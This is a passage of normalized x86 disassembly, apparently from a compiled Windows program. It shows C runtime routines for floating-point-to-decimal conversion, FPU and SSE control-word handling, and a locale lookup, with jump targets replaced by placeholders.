jne r-xdata
inc edx
test [ ebp - 0x34 ] 0x7fffffff
jne r-xdata
mov [ ebp - 0x34 ] eax
mov [ ebp - 0x68 ] esi
lea edi [ ebp - 0x28 ]
mov [ ebp - 0x58 ] 0x5
inc edx
test [ ebx + 0x8 ] 0x7fffffff
jne r-xdata
cmp [ ebp - 0x38 ] esi
jne r-xdata
inc edi
inc edi
inc [ ebp - 0x68 ]
dec [ ebp - 0x58 ]
cmp [ ebp - 0x58 ] 0x0
jg r-xdata
lea eax [ ebp + eax - 0x3c ]
mov [ ebp - 0x5c ] eax
lea eax [ ebx + 0x8 ]
mov [ ebp - 0x60 ] eax
cmp [ ebx + 0x4 ] esi
jne r-xdata
cmp [ ebp - 0x3c ] esi
jne r-xdata
mov eax [ ebp - 0x68 ]
mov ecx [ ebp - 0x58 ]
add eax eax
mov [ ebp - 0x64 ] ecx
test ecx ecx
jle r-xdata
add edx 0xc002
test dx dx
jle r-xdata
mov [ ebp - 0x4c ] 0x1
cmp esi eax
jae r-xdata
cmp [ ebx ] esi
jne r-xdata
xor eax eax
mov [ ebp - 0x32 ] ax
jmp r-xdata
add edx 0xffff
test dx dx
jge r-xdata
mov edi [ ebp - 0x24 ]
test edi edi
js r-xdata
add [ ebp - 0x5c ] 0x2
sub [ ebp - 0x60 ] 0x2
dec [ ebp - 0x64 ]
cmp [ ebp - 0x64 ] 0x0
jg r-xdata
inc [ edi ]
cmp [ ebp - 0x4c ] 0x0
mov [ edi - 0x4 ] esi
je r-xdata
mov [ ebp - 0x34 ] esi
mov [ ebp - 0x38 ] esi
mov [ ebp - 0x3c ] esi
jmp r-xdata
mov eax 0x8000
mov ecx eax
cmp [ ebp - 0x2c ] cx
ja r-xdata
mov eax edx
neg eax
movzx esi ax
add edx esi
test dx dx
jg r-xdata
mov esi [ ebp - 0x28 ]
mov eax [ ebp - 0x2c ]
shl [ ebp - 0x2c ] 0x1
shr eax 0x1f
mov ecx esi
add esi esi
or esi eax
shr ecx 0x1f
lea eax [ edi + edi ]
or eax ecx
add edx 0xffff
mov [ ebp - 0x28 ] esi
mov [ ebp - 0x24 ] eax
test dx dx
jg r-xdata
mov eax [ ebp - 0x60 ]
mov ecx [ ebp - 0x5c ]
movzx ecx [ ecx ]
movzx eax [ eax ]
and [ ebp - 0x4c ] 0x0
imul eax ecx
mov ecx [ edi - 0x4 ]
lea esi [ ecx + eax ]
cmp esi ecx
jb r-xdata
cmp [ ebp - 0x2a ] 0xffffffff
jne r-xdata
mov ecx [ ebp - 0x2c ]
and ecx 0x1ffff
cmp ecx 0x18000
jne r-xdata
mov eax [ ebp - 0x24 ]
mov edi [ ebp - 0x28 ]
mov ecx [ ebp - 0x28 ]
shr [ ebp - 0x24 ] 0x1
shl eax 0x1f
shr edi 0x1
or edi eax
mov eax [ ebp - 0x2c ]
shl ecx 0x1f
shr eax 0x1
or eax ecx
dec esi
mov [ ebp - 0x28 ] edi
mov [ ebp - 0x2c ] eax
jne r-xdata
inc [ ebp - 0x50 ]
inc [ ebp - 0x2a ]
and [ ebp - 0x2a ] 0x0
cmp [ ebp - 0x26 ] 0xffffffff
jne r-xdata
mov eax 0x7fff
cmp dx ax
jb r-xdata
test [ ebp - 0x2c ] 0x1
je r-xdata
cmp [ ebp - 0x50 ] esi
je r-xdata
mov ax [ ebp - 0x2a ]
or edx [ ebp - 0x70 ]
mov [ ebp - 0x3c ] ax
mov eax [ ebp - 0x28 ]
mov [ ebp - 0x3a ] eax
mov eax [ ebp - 0x24 ]
mov [ ebp - 0x36 ] eax
mov [ ebp - 0x32 ] dx
jmp r-xdata
xor eax eax
xor ecx ecx
cmp [ ebp - 0x70 ] ax
mov [ ebp - 0x38 ] eax
sete cl
mov [ ebp - 0x3c ] eax
dec ecx
and ecx 0x80000000
add ecx 0x7fff8000
mov [ ebp - 0x34 ] ecx
jmp r-xdata
inc [ ebp - 0x26 ]
jmp r-xdata
and [ ebp - 0x26 ] 0x0
mov ecx 0xffff
cmp [ ebp - 0x22 ] cx
jne r-xdata
or [ ebp - 0x2c ] 0x1
inc [ ebp - 0x22 ]
jmp r-xdata
mov [ ebp - 0x22 ] ax
inc edx
jmp r-xdata
sub_424205
mov edi edi
push ebp
mov ebp esp
sub esp 0x74
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
mov ebx [ ebp + 0x1c ]
push esi
push edi
lea esi [ ebp + 0x8 ]
lea edi [ ebp - 0x10 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsw [ edi ] [ esi ]
mov edx [ ebp - 0x8 ]
mov ecx edx
mov eax 0x8000
and ecx eax
and edx 0x7fff
mov [ ebp - 0x60 ] ebx
mov [ ebp - 0x30 ] 0xcc
mov [ ebp - 0x2f ] 0xcc
mov [ ebp - 0x2e ] 0xcc
mov [ ebp - 0x2d ] 0xcc
mov [ ebp - 0x2c ] 0xcc
mov [ ebp - 0x2b ] 0xcc
mov [ ebp - 0x2a ] 0xcc
mov [ ebp - 0x29 ] 0xcc
mov [ ebp - 0x28 ] 0xcc
mov [ ebp - 0x27 ] 0xcc
mov [ ebp - 0x26 ] 0xfb
mov [ ebp - 0x25 ] 0x3f
mov [ ebp - 0x74 ] 0x1
mov [ ebp - 0x70 ] ecx
test cx cx
je r-xdata
mov [ ebx + 0x2 ] 0x20
mov [ ebx + 0x2 ] 0x2d
jmp r-xdata
mov eax 0x7fff
cmp dx ax
jne r-xdata
test esi esi
jne r-xdata
mov esi [ ebp - 0xc ]
mov edi [ ebp - 0x10 ]
test dx dx
jne r-xdata
movzx ecx dx
mov ebx ecx
imul ecx ecx 0x4d10
shr ebx 0x8
mov eax esi
shr eax 0x18
lea eax [ ebx + eax * 2 ]
imul eax eax 0x4d
lea eax [ eax + ecx - 0x134312f4 ]
sar eax 0x10
movzx eax ax
xor ecx ecx
movsx ebx ax
mov [ ebp - 0x20 ] cx
mov ecx rw-data
neg ebx
sub ecx 0x60
mov [ ebp - 0x4c ] eax
mov [ ebp - 0x16 ] dx
mov [ ebp - 0x1a ] esi
mov [ ebp - 0x1e ] edi
mov [ ebp - 0x64 ] ecx
test ebx ebx
je r-xdata
xor eax eax
inc eax
mov [ ebx ] ax
mov eax 0x80000000
cmp esi eax
jne r-xdata
test edi edi
jne r-xdata
mov ecx [ ebp - 0x18 ]
shr ecx 0x10
mov edx 0x3fff
mov eax 0x7fff
cmp cx dx
jb r-xdata
jge r-xdata
test esi 0x40000000
jne r-xdata
test edi edi
je r-xdata
xor edx edx
cmp cx ax
setne al
dec al
and al 0xd
add al 0x20
mov [ ebx ] dx
mov [ ebx + 0x2 ] al
mov [ ebx + 0x3 ] 0x1
mov [ ebx + 0x4 ] 0x30
mov [ ebx + 0x5 ] dl
test [ ebp + 0x18 ] 0x1
mov edx [ ebp - 0x60 ]
mov eax [ ebp - 0x4c ]
mov edi [ ebp + 0x14 ]
mov [ edx ] ax
je r-xdata
inc [ ebp - 0x4c ]
xor edx edx
mov [ ebp - 0x50 ] edx
mov [ ebp - 0x10 ] edx
mov [ ebp - 0xc ] edx
mov [ ebp - 0x8 ] edx
mov edx [ ebp - 0x26 ]
movzx ecx cx
mov ebx edx
xor ebx ecx
and ecx eax
and edx eax
and ebx 0x8000
mov edi eax
lea esi [ edx + ecx ]
mov [ ebp - 0x5c ] ebx
movzx esi si
cmp cx di
jae r-xdata
test ebx ebx
je r-xdata
mov eax rw-data
neg ebx
sub eax 0x60
mov [ ebp - 0x64 ] eax
test cx cx
je r-xdata
push r--data
jmp r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_414a33
leave
retn
cmp edi 0x15
jle r-xdata
cwde
add edi eax
test edi edi
jg r-xdata
xor eax eax
test bx bx
sete al
and [ ebp - 0x1c ] 0x0
dec eax
and eax 0x80000000
add eax 0x7fff8000
and [ ebp - 0x20 ] 0x0
cmp dx ax
jae r-xdata
add [ ebp - 0x64 ] 0x54
mov ecx ebx
and ecx 0x7
sar ebx 0x3
test ecx ecx
je r-xdata
cmp esi eax
jne r-xdata
cmp esi 0xc0000000
jne r-xdata
lea eax [ ebx + 0x4 ]
push 0x16
push eax
call sub_418db8
add esp 0xc
xor esi esi
test eax eax
je r-xdata
mov esi [ ebp - 0x18 ]
shr esi 0x10
sub esi 0x3ffe
xor eax eax
mov [ ebp - 0x16 ] ax
mov [ ebp - 0x44 ] 0x8
push 0x15
pop edi
xor eax eax
mov [ edx ] ax
mov eax 0x8000
cmp [ ebp - 0x70 ] ax
mov [ edx + 0x3 ] 0x1
setne al
dec al
and al 0xd
add al 0x20
mov [ edx + 0x2 ] al
mov [ edx + 0x4 ] 0x30
mov [ edx + 0x5 ] 0x0
jmp r-xdata
mov eax 0xbffd
cmp si ax
ja r-xdata
xor esi esi
imul ecx ecx 0xc
add ecx [ ebp - 0x64 ]
mov eax ecx
mov [ ebp - 0x44 ] ecx
mov ecx 0x8000
cmp [ eax ] cx
jb r-xdata
push r--data
test edi edi
jne r-xdata
test edi edi
jne r-xdata
mov [ ebx + 0x3 ] 0x6
push esi
push esi
push esi
push esi
push esi
call sub_415289
add esp 0x14
mov eax [ ebp - 0x20 ]
mov ebx [ ebp - 0x1c ]
mov ecx [ ebp - 0x1c ]
shl [ ebp - 0x20 ] 0x1
shr eax 0x1f
add ebx ebx
or ebx eax
mov eax [ ebp - 0x18 ]
shr ecx 0x1f
add eax eax
or eax ecx
dec [ ebp - 0x44 ]
mov [ ebp - 0x1c ] ebx
mov [ ebp - 0x18 ] eax
jne r-xdata
test esi esi
jge r-xdata
xor eax eax
inc eax
jmp r-xdata
mov eax 0x3fbf
cmp si ax
ja r-xdata
movzx edx [ eax + 0xa ]
xor ecx ecx
mov [ ebp - 0x54 ] ecx
mov [ ebp - 0x10 ] ecx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] ecx
mov ecx [ ebp - 0x16 ]
mov esi edx
xor esi ecx
and esi 0x8000
mov [ ebp - 0x48 ] esi
mov esi 0x7fff
and ecx esi
and edx esi
lea esi [ edx + ecx ]
movzx edi si
mov esi 0x7fff
cmp cx si
jae r-xdata
mov esi eax
lea edi [ ebp - 0x3c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
lea eax [ ebp - 0x3c ]
movsd [ edi ] [ esi ]
dec [ ebp - 0x3a ]
mov [ ebp - 0x44 ] eax
push r--data
push r--data
jmp r-xdata
lea eax [ edi + 0x1 ]
lea ebx [ edx + 0x4 ]
mov [ ebp - 0x40 ] ebx
mov [ ebp - 0x4c ] eax
test eax eax
jle r-xdata
neg esi
and esi 0xff
jle r-xdata
xor eax eax
cmp cx ax
jne r-xdata
xor eax eax
xor eax eax
xor esi esi
cmp [ ebp - 0x48 ] si
sete al
dec eax
and eax 0x80000000
add eax 0x7fff8000
mov [ ebp - 0x18 ] eax
jmp r-xdata
cmp dx si
jae r-xdata
mov [ ebx + 0x3 ] 0x5
jmp r-xdata
push esi
push esi
push esi
push esi
push esi
call sub_415289
add esp 0x14
lea eax [ ebx + 0x4 ]
push 0x16
push eax
call sub_418db8
add esp 0xc
xor esi esi
test eax eax
je r-xdata
dec ebx
mov al [ ebx ]
dec ebx
cmp al 0x35
jge r-xdata
mov edx [ ebp - 0x20 ]
mov eax [ ebp - 0x1c ]
lea esi [ ebp - 0x20 ]
lea edi [ ebp - 0x3c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
shl [ ebp - 0x20 ] 0x1
mov edi [ ebp - 0x20 ]
shl [ ebp - 0x20 ] 0x1
shr edx 0x1f
lea ecx [ eax + eax ]
or ecx edx
mov edx [ ebp - 0x18 ]
mov esi eax
shr esi 0x1f
add edx edx
or edx esi
mov eax ecx
lea esi [ ecx + ecx ]
shr eax 0x1f
lea ecx [ edx + edx ]
mov edx [ ebp - 0x3c ]
shr edi 0x1f
or ecx eax
mov eax [ ebp - 0x20 ]
or esi edi
lea edi [ edx + eax ]
cmp edi eax
jb r-xdata
mov eax [ ebp - 0x18 ]
mov ebx [ ebp - 0x1c ]
mov ecx [ ebp - 0x1c ]
shr [ ebp - 0x18 ] 0x1
shl eax 0x1f
shr ebx 0x1
or ebx eax
mov eax [ ebp - 0x20 ]
shl ecx 0x1f
shr eax 0x1
or eax ecx
dec esi
mov [ ebp - 0x1c ] ebx
mov [ ebp - 0x20 ] eax
test esi esi
jg r-xdata
cmp dx ax
jne r-xdata
inc esi
test [ ebp - 0x18 ] 0x7fffffff
jne r-xdata
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x1c ] esi
mov [ ebp - 0x20 ] esi
jmp r-xdata
mov esi 0xbffd
cmp di si
ja r-xdata
xor eax eax
jmp r-xdata
cmp ebx [ ebp - 0x40 ]
jae r-xdata
mov ecx [ ebp - 0x40 ]
jmp r-xdata
lea eax [ esi + 0x1 ]
xor edx edx
cmp eax esi
jb r-xdata
cmp edi edx
jae r-xdata
mov [ ebp - 0x58 ] eax
lea edi [ ebp - 0xc ]
mov [ ebp - 0x40 ] 0x5
inc esi
test [ ebp - 0x28 ] 0x7fffffff
jne r-xdata
cmp [ ebp - 0x1c ] eax
jne r-xdata
cmp ebx esi
jne r-xdata
mov esi 0x3fbf
cmp di si
ja r-xdata
cmp [ ebx ] 0x39
jne r-xdata
mov eax [ ebp - 0x60 ]
cmp ebx [ ebp - 0x40 ]
jae r-xdata
cmp ebx ecx
jae r-xdata
xor edx edx
inc edx
cmp eax 0x1
jae r-xdata
mov eax [ ebp - 0x38 ]
lea edx [ eax + esi ]
mov [ ebp - 0x44 ] edx
cmp edx esi
jb r-xdata
inc edi
inc edi
inc [ ebp - 0x58 ]
dec [ ebp - 0x40 ]
cmp [ ebp - 0x40 ] 0x0
jg r-xdata
lea ecx [ ebp - 0x28 ]
mov [ ebp - 0x48 ] ecx
lea eax [ ebp + eax - 0x20 ]
cmp [ ebp - 0x2c ] eax
jne r-xdata
cmp [ ebp - 0x20 ] eax
jne r-xdata
xor esi esi
cmp cx si
jne r-xdata
xor esi esi
mov [ ebx ] 0x30
dec ebx
inc [ ebx ]
inc ebx
inc [ eax ]
cmp [ ebx ] 0x30
jne r-xdata
mov eax [ ebp - 0x60 ]
cmp ebx ecx
jae r-xdata
inc ecx
mov esi eax
test edx edx
je r-xdata
inc ecx
cmp edx eax
jae r-xdata
mov eax [ ebp - 0x58 ]
mov ecx [ ebp - 0x40 ]
add eax eax
mov [ ebp - 0x54 ] ecx
test ecx ecx
jle r-xdata
add esi 0xc002
test si si
jle r-xdata
mov [ ebp - 0x44 ] 0x1
cmp ebx ecx
jae r-xdata
cmp [ ebp - 0x30 ] eax
je r-xdata
mov [ ebp - 0x16 ] ax
jmp r-xdata
cmp dx si
jne r-xdata
inc edi
test [ ebp - 0x18 ] 0x7fffffff
jne r-xdata
dec ebx
sub bl al
sub bl 0x3
movsx ecx bl
mov [ eax + 0x3 ] bl
mov [ ecx + eax + 0x4 ] 0x0
mov eax [ ebp - 0x74 ]
xor edx edx
mov [ eax ] dx
mov edx 0x8000
cmp [ ebp - 0x70 ] dx
mov [ eax + 0x3 ] 0x1
setne dl
dec dl
and dl 0xd
add dl 0x20
mov [ eax + 0x2 ] dl
mov [ ecx ] 0x30
mov [ eax + 0x5 ] 0x0
jmp r-xdata
add ecx [ ebp - 0x34 ]
shr edx 0x1f
add ecx ecx
or ecx edx
lea esi [ edi + edi ]
mov [ ebp - 0x20 ] esi
mov esi [ ebp - 0x44 ]
mov [ ebp - 0x18 ] ecx
shr ecx 0x18
add esi esi
add cl 0x30
mov eax edi
shr eax 0x1f
or esi eax
mov [ ebx ] cl
inc ebx
dec [ ebp - 0x4c ]
cmp [ ebp - 0x4c ] 0x0
mov [ ebp - 0x1c ] esi
mov [ ebp - 0x15 ] 0x0
jg r-xdata
add esi 0xffff
test si si
jge r-xdata
mov edi [ ebp - 0x8 ]
test edi edi
js r-xdata
sub [ ebp - 0x48 ] 0x2
inc eax
inc eax
dec [ ebp - 0x54 ]
cmp [ ebp - 0x54 ] 0x0
jg r-xdata
inc [ edi ]
cmp [ ebp - 0x44 ] 0x0
mov [ edi - 0x4 ] ebx
je r-xdata
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x20 ] eax
jmp r-xdata
and [ ebp - 0x58 ] esi
lea esi [ ebp - 0xc ]
mov [ ebp - 0x40 ] 0x5
inc edi
test [ eax + 0x8 ] 0x7fffffff
jne r-xdata
cmp [ ebp - 0x1c ] esi
jne r-xdata
mov eax 0x8000
mov ecx eax
cmp [ ebp - 0x10 ] cx
ja r-xdata
mov eax esi
neg eax
movzx eax ax
add esi eax
test si si
jg r-xdata
mov eax [ ebp - 0xc ]
mov ecx [ ebp - 0x10 ]
shl [ ebp - 0x10 ] 0x1
mov edx eax
add eax eax
shr ecx 0x1f
or eax ecx
mov [ ebp - 0xc ] eax
shr edx 0x1f
lea eax [ edi + edi ]
or eax edx
add esi 0xffff
mov [ ebp - 0x8 ] eax
test si si
jg r-xdata
mov ecx [ ebp - 0x48 ]
movzx edx [ eax ]
movzx ecx [ ecx ]
and [ ebp - 0x44 ] 0x0
imul ecx edx
mov edx [ edi - 0x4 ]
lea ebx [ edx + ecx ]
cmp ebx edx
jb r-xdata
inc esi
inc esi
inc [ ebp - 0x58 ]
dec [ ebp - 0x40 ]
cmp [ ebp - 0x40 ] 0x0
jg r-xdata
lea ecx [ ebp + ecx - 0x20 ]
add eax 0x8
mov [ ebp - 0x6c ] ecx
mov [ ebp - 0x68 ] eax
cmp [ eax + 0x4 ] esi
jne r-xdata
cmp [ ebp - 0x20 ] esi
jne r-xdata
cmp [ ebp - 0xe ] 0xffffffff
jne r-xdata
mov ecx [ ebp - 0x10 ]
and ecx 0x1ffff
cmp ecx 0x18000
jne r-xdata
mov ecx [ ebp - 0x8 ]
mov edi [ ebp - 0xc ]
mov edx [ ebp - 0xc ]
shr [ ebp - 0x8 ] 0x1
shl ecx 0x1f
shr edi 0x1
or edi ecx
mov ecx [ ebp - 0x10 ]
shl edx 0x1f
shr ecx 0x1
or ecx edx
dec eax
mov [ ebp - 0xc ] edi
mov [ ebp - 0x10 ] ecx
jne r-xdata
inc [ ebp - 0x50 ]
mov ecx [ ebp - 0x58 ]
mov edx [ ebp - 0x40 ]
add ecx ecx
mov [ ebp - 0x50 ] edx
test edx edx
jle r-xdata
add edi 0xc002
test di di
jle r-xdata
mov [ ebp - 0x5c ] 0x1
cmp eax ecx
jae r-xdata
cmp [ eax ] esi
je r-xdata
xor eax eax
mov [ ebp - 0x16 ] ax
jmp r-xdata
inc [ ebp - 0xe ]
and [ ebp - 0xe ] 0x0
cmp [ ebp - 0xa ] 0xffffffff
jne r-xdata
mov eax 0x7fff
cmp si ax
jb r-xdata
test [ ebp - 0x10 ] 0x1
je r-xdata
cmp [ ebp - 0x50 ] eax
je r-xdata
add edi 0xffff
test di di
jge r-xdata
test [ ebp - 0x8 ] 0x80000000
jne r-xdata
add [ ebp - 0x6c ] 0x2
sub [ ebp - 0x68 ] 0x2
dec [ ebp - 0x50 ]
cmp [ ebp - 0x50 ] 0x0
jg r-xdata
inc [ esi ]
cmp [ ebp - 0x5c ] 0x0
mov [ esi - 0x4 ] eax
je r-xdata
mov [ ebp - 0x18 ] esi
mov ax [ ebp - 0xe ]
or esi [ ebp - 0x5c ]
mov [ ebp - 0x20 ] ax
mov eax [ ebp - 0xc ]
mov [ ebp - 0x1e ] eax
mov eax [ ebp - 0x8 ]
mov [ ebp - 0x1a ] eax
mov [ ebp - 0x16 ] si
jmp r-xdata
xor eax eax
xor ecx ecx
cmp [ ebp - 0x5c ] ax
mov [ ebp - 0x1c ] eax
sete cl
mov [ ebp - 0x20 ] eax
dec ecx
and ecx 0x80000000
add ecx 0x7fff8000
mov [ ebp - 0x18 ] ecx
jmp r-xdata
inc [ ebp - 0xa ]
jmp r-xdata
and [ ebp - 0xa ] 0x0
mov ecx 0xffff
cmp [ ebp - 0x6 ] cx
jne r-xdata
or [ ebp - 0x10 ] 0x1
mov eax 0x8000
mov ecx eax
cmp [ ebp - 0x10 ] cx
ja r-xdata
mov eax edi
neg eax
movzx eax ax
add edi eax
test di di
jg r-xdata
mov eax [ ebp - 0xc ]
mov ecx [ ebp - 0x10 ]
shl [ ebp - 0x10 ] 0x1
mov edx eax
add eax eax
shr ecx 0x1f
or eax ecx
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x8 ]
shr edx 0x1f
add eax eax
or eax edx
add edi 0xffff
mov [ ebp - 0x8 ] eax
test di di
jg r-xdata
mov eax [ ebp - 0x6c ]
movzx ecx [ eax ]
mov eax [ ebp - 0x68 ]
movzx eax [ eax ]
mov edx [ esi - 0x4 ]
imul ecx eax
and [ ebp - 0x5c ] 0x0
lea eax [ edx + ecx ]
cmp eax edx
jb r-xdata
mov eax [ ebp - 0x44 ]
inc [ ebp - 0x6 ]
jmp r-xdata
mov [ ebp - 0x6 ] ax
inc esi
jmp r-xdata
cmp [ ebp - 0xe ] 0xffffffff
jne r-xdata
mov ecx [ ebp - 0x10 ]
and ecx 0x1ffff
cmp ecx 0x18000
jne r-xdata
mov ecx [ ebp - 0x8 ]
mov esi [ ebp - 0xc ]
mov edx [ ebp - 0xc ]
shr [ ebp - 0x8 ] 0x1
shl ecx 0x1f
shr esi 0x1
or esi ecx
mov ecx [ ebp - 0x10 ]
shl edx 0x1f
shr ecx 0x1
or ecx edx
dec eax
mov [ ebp - 0xc ] esi
mov [ ebp - 0x10 ] ecx
jne r-xdata
inc [ ebp - 0x54 ]
inc [ ebp - 0xe ]
and [ ebp - 0xe ] 0x0
cmp [ ebp - 0xa ] 0xffffffff
jne r-xdata
mov eax 0x7fff
cmp di ax
jb r-xdata
test [ ebp - 0x10 ] 0x1
je r-xdata
cmp [ ebp - 0x54 ] eax
je r-xdata
mov ax [ ebp - 0xe ]
or edi [ ebp - 0x48 ]
mov [ ebp - 0x20 ] ax
mov eax [ ebp - 0xc ]
mov [ ebp - 0x1e ] eax
mov eax [ ebp - 0x8 ]
mov [ ebp - 0x1a ] eax
mov [ ebp - 0x16 ] di
jmp r-xdata
xor eax eax
xor ecx ecx
cmp [ ebp - 0x48 ] ax
mov [ ebp - 0x1c ] eax
sete cl
mov [ ebp - 0x20 ] eax
dec ecx
and ecx 0x80000000
add ecx 0x7fff8000
mov [ ebp - 0x18 ] ecx
inc [ ebp - 0xa ]
jmp r-xdata
and [ ebp - 0xa ] 0x0
mov ecx 0xffff
cmp [ ebp - 0x6 ] cx
jne r-xdata
or [ ebp - 0x10 ] 0x1
inc [ ebp - 0x6 ]
jmp r-xdata
mov [ ebp - 0x6 ] ax
inc edi
jmp r-xdata
sub_424b29
xor eax eax
test bl 0x10
je r-xdata
test bl 0x8
je r-xdata
inc eax
test bl 0x4
je r-xdata
or eax 0x4
test bl 0x2
je r-xdata
or eax 0x8
test bl 0x1
je r-xdata
or eax 0x10
test ebx 0x80000
je r-xdata
or eax 0x20
mov ecx ebx
mov edx 0x300
and ecx edx
push esi
mov esi 0x200
je r-xdata
or eax 0x2
mov ecx ebx
and ecx 0x30000
je r-xdata
cmp ecx 0x100
je r-xdata
or eax edx
cmp ecx 0x10000
jne r-xdata
or eax 0x400
cmp ecx esi
je r-xdata
retn
or eax 0x1000
pop esi
test ebx 0x40000
je r-xdata
or eax esi
jmp r-xdata
or eax 0x800
jmp r-xdata
cmp ecx edx
jne r-xdata
or eax 0xc00
jmp r-xdata
sub_424bb7
xor eax eax
test dl 0x10
je r-xdata
push ebx
push esi
push edi
mov ebx 0x200
test dl 0x8
je r-xdata
mov eax 0x80
test dl 0x4
je r-xdata
or eax ebx
test dl 0x2
je r-xdata
or eax 0x400
test dl 0x1
je r-xdata
or eax 0x800
mov edi 0x100
test edx 0x80000
je r-xdata
or eax 0x1000
mov ecx edx
mov esi 0x300
and ecx esi
je r-xdata
or eax edi
mov ecx 0x3000000
pop edi
and edx ecx
pop esi
pop ebx
cmp edx 0x1000000
je r-xdata
cmp ecx edi
je r-xdata
or eax 0x8040
cmp edx 0x2000000
je r-xdata
or eax 0x2000
cmp ecx ebx
je r-xdata
or eax 0x40
retn
cmp edx ecx
jne r-xdata
or eax 0x4000
jmp r-xdata
cmp ecx esi
jne r-xdata
retn
or eax 0x8000
retn
or eax 0x6000
jmp r-xdata
sub_424c57
mov edi edi
push ebp
mov ebp esp
sub esp 0x14
push ebx
push esi
push edi
fwait
fnstcw [ ebp - 0x8 ]
mov ebx [ ebp - 0x8 ]
xor edx edx
test bl 0x1
je r-xdata
test bl 0x4
je r-xdata
push 0x10
pop edx
test bl 0x8
je r-xdata
or edx 0x8
test bl 0x10
je r-xdata
or edx 0x4
test bl 0x20
je r-xdata
or edx 0x2
test bl 0x2
je r-xdata
or edx 0x1
movzx ecx bx
mov eax ecx
mov esi 0xc00
and eax esi
mov edi 0x300
je r-xdata
or edx 0x80000
and ecx edi
je r-xdata
cmp eax 0x400
je r-xdata
or edx 0x20000
cmp ecx 0x200
jne r-xdata
or edx 0x100
cmp eax 0x800
je r-xdata
mov edi [ ebp + 0xc ]
mov ecx [ ebp + 0x8 ]
mov eax edi
not eax
and eax edx
and ecx edi
or eax ecx
mov [ ebp + 0xc ] eax
cmp eax edx
je r-xdata
or edx 0x40000
test ebx 0x1000
je r-xdata
or edx 0x10000
jmp r-xdata
or edx 0x200
jmp r-xdata
cmp eax esi
jne r-xdata
xor esi esi
cmp [ rw-data ] esi
je r-xdata
mov ebx eax
call sub_424b29
movzx eax ax
mov [ ebp - 0x4 ] eax
fldcw [ ebp - 0x4 ]
fwait
fnstcw [ ebp - 0x4 ]
mov ebx [ ebp - 0x4 ]
xor edx edx
test bl 0x1
je r-xdata
or edx edi
jmp r-xdata
pop edi
pop esi
pop ebx
leave
retn
and edi 0x308031f
mov [ ebp - 0x14 ] edi
stmxcsr [ ebp - 0x10 ]
mov eax [ ebp - 0x10 ]
test al al
jns r-xdata
test bl 0x4
je r-xdata
push 0x10
pop edx
test eax 0x200
je r-xdata
push 0x10
pop esi
test bl 0x8
je r-xdata
or edx 0x8
test eax 0x400
je r-xdata
or esi 0x8
test bl 0x10
je r-xdata
or edx 0x4
test eax 0x800
je r-xdata
or esi 0x4
test bl 0x20
je r-xdata
or edx 0x2
test eax 0x1000
je r-xdata
or esi 0x2
test bl 0x2
je r-xdata
or edx 0x1
test eax 0x100
je r-xdata
or esi 0x1
movzx ecx bx
mov eax ecx
and eax esi
je r-xdata
or edx 0x80000
mov ecx eax
mov ebx 0x6000
and ecx ebx
je r-xdata
or esi 0x80000
and ecx 0x300
je r-xdata
cmp eax 0x400
je r-xdata
mov edi 0x8040
and eax edi
sub eax 0x40
je r-xdata
cmp ecx 0x2000
je r-xdata
or edx 0x20000
cmp ecx 0x200
jne r-xdata
or edx 0x100
cmp eax 0x800
je r-xdata
or esi 0x2000000
sub eax 0x7fc0
je r-xdata
or esi 0x100
cmp ecx 0x4000
je r-xdata
mov [ ebp + 0xc ] edx
mov eax edx
or edx 0x40000
test ebx 0x1000
je r-xdata
or edx 0x10000
jmp r-xdata
or edx 0x200
jmp r-xdata
cmp eax esi
jne r-xdata
call sub_424bb7
push eax
mov [ ebp - 0xc ] eax
call sub_41f730
pop ecx
stmxcsr [ ebp - 0xc ]
mov ecx [ ebp - 0xc ]
xor edx edx
test cl cl
jns r-xdata
mov eax esi
jmp r-xdata
or esi 0x3000000
jmp r-xdata
sub eax 0x40
jne r-xdata
or esi 0x200
jmp r-xdata
cmp ecx ebx
jne r-xdata
or edx 0x300
jmp r-xdata
test ecx 0x200
je r-xdata
push 0x10
pop edx
mov ecx eax
xor ecx [ ebp + 0xc ]
or eax [ ebp + 0xc ]
test ecx 0x8031f
je r-xdata
mov eax [ ebp - 0x14 ]
mov edx eax
and eax [ ebp + 0x8 ]
not edx
and edx esi
or edx eax
cmp edx esi
jne r-xdata
or esi 0x1000000
jmp r-xdata
or esi 0x300
jmp r-xdata
test ecx 0x400
je r-xdata
or edx 0x8
or eax 0x80000000
test ecx 0x800
je r-xdata
or edx 0x4
test ecx 0x1000
je r-xdata
or edx 0x2
mov esi 0x100
test esi ecx
je r-xdata
or edx 0x1
mov eax ecx
and eax ebx
je r-xdata
or edx 0x80000
and ecx edi
sub ecx 0x40
je r-xdata
cmp eax 0x2000
je r-xdata
or edx 0x2000000
sub ecx 0x7fc0
je r-xdata
or edx esi
cmp eax 0x4000
je r-xdata
or edx 0x3000000
jmp r-xdata
sub ecx 0x40
jne r-xdata
or edx 0x200
jmp r-xdata
cmp eax ebx
jne r-xdata
mov eax edx
or edx 0x1000000
jmp r-xdata
or edx 0x300
jmp r-xdata
sub_424f66
mov edi edi
push ebp
mov ebp esp
sub esp 0xc
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push 0x6
lea eax [ ebp - 0xc ]
push eax
push 0x1004
push [ ebp + 0x8 ]
mov [ ebp - 0x6 ] 0x0
call [ GetLocaleInfoA@IAT ]
test eax eax
jne r-xdata
lea eax [ ebp - 0xc ]
push eax
call sub_421e0d
pop ecx
or eax 0xffffffff
jmp r-xdata
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_414a33
leave
retn
sub_424fb1
mov edi edi
push ebp
mov ebp esp
sub esp 0x34
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x10 ]
mov ecx [ ebp + 0x18 ]
mov [ ebp - 0x28 ] eax
mov eax [ ebp + 0x14 ]
push ebx
mov [ ebp - 0x30 ] eax
mov eax [ eax ]
push esi
mov [ ebp - 0x24 ] eax
mov eax [ ebp + 0x8 ]
push edi
xor edi edi
